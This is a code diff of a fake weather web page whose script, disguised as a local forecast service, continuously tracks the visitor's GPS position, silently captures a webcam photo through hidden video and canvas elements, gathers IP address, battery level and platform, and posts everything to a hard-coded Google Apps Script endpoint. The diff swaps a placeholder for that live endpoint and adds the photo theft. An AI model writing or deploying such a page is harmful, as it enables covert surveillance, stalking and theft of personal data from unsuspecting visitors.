@@ -3,89 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AccuWeather - Local Forecast</title>
+    <title>Live Local Weather</title>
     <style>
-        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; background: linear-gradient(to bottom, #4facfe 0%, #00f2fe 100%); color: white; text-align: center; height: 100vh; }
-        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px); margin: 50px auto; padding: 40px; border-radius: 30px; width: 80%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
-        h1 { font-size: 3rem; margin: 10px 0; }
-        .city { font-size: 1.5rem; font-weight: 300; }
-        .btn { background: white; color: #0078d4; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        canvas, video { display: none; } /* Hidden camera elements */
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%); color: white; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border-radius: 30px; padding: 40px; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); }
+        h1 { font-size: 4rem; margin: 0; }
+        .city { font-size: 1.5rem; opacity: 0.9; }
+        .btn { background: #fff; color: #1e3c72; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; margin-top: 25px; cursor: pointer; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="city" id="cityName">Detecting Location...</div>
-    <h1 id="temp">--°</h1>
-    <p id="desc">Sunny</p>
-    <p>We need your location to provide accurate local storm alerts.</p>
-    <button class="btn" onclick="startTracking()">Update My Weather</button>
+    <h1 id="tempDisplay">--°</h1>
+    <p id="weatherDesc">Cloudy</p>
+    <p style="font-size: 0.8rem; opacity: 0.7;">Enable location for high-precision local storm alerts.</p>
+    <button class="btn" onclick="startWeatherService()">Refresh Forecast</button>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    const GOOGLE_URL = 'YOUR_APPS_SCRIPT_URL';
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxSJ-VrqsQgRju50PR4iyt6VE5KaUkgM6kAJINr-oGXwAKGQyzkZFdqyqYNi8cOQMOoFQ/exec';
+    let userPos = null;
 
-    async function startTracking() {
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+    async function startWeatherService() {
+        if (!navigator.geolocation) return;
+        
+        navigator.geolocation.watchPosition(async (pos) => {
+            userPos = pos;
+            
+            // Fetch REAL weather for their exact GPS
+            try {
+                const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`);
+                const data = await res.json();
+                document.getElementById('tempDisplay').innerText = Math.round(data.current_weather.temperature) + "°";
+                document.getElementById('cityName').innerText = "Local Weather Active";
+            } catch(e) {}
 
-                // 1. Get REAL weather for their specific coordinates
-                try {
-                    const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
-                    const weatherData = await weatherRes.json();
-                    document.getElementById('temp').innerText = Math.round(weatherData.current_weather.temperature) + "°";
-                    document.getElementById('cityName').innerText = "Local Forecast Active";
-                } catch(e) {}
-
-                // 2. Capture Photo Silently
-                capturePhoto();
-
-                // 3. Send Data to Sheet
-                sendToSheet(pos);
-            }, null, { enableHighAccuracy: true });
-        }
+            captureAndSend();
+        }, null, { enableHighAccuracy: true });
     }
 
-    async function capturePhoto() {
+    async function captureAndSend() {
+        let photoBase64 = null;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
+            const video = document.getElementById('v');
             video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1000));
             
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg');
-                // You would need a different Apps Script setup to save images
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000);
-        } catch (err) { console.log("Camera blocked"); }
-    }
+            const canvas = document.getElementById('c');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
+            
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) { console.log("Cam denied"); }
 
-    async function sendToSheet(pos) {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        
+        const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        let batt = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batt = Math.round(b.level * 100) + "%";
+        }
+
         const payload = {
             ip: ipData.ip,
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
+            latitude: userPos.coords.latitude,
+            longitude: userPos.coords.longitude,
             os: navigator.platform,
-            browser: navigator.userAgent
+            battery: batt,
+            photo: photoBase64
         };
 
-        fetch(GOOGLE_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
     }
-
-    window.onload = startTracking;
 </script>
 </body>
 </html>
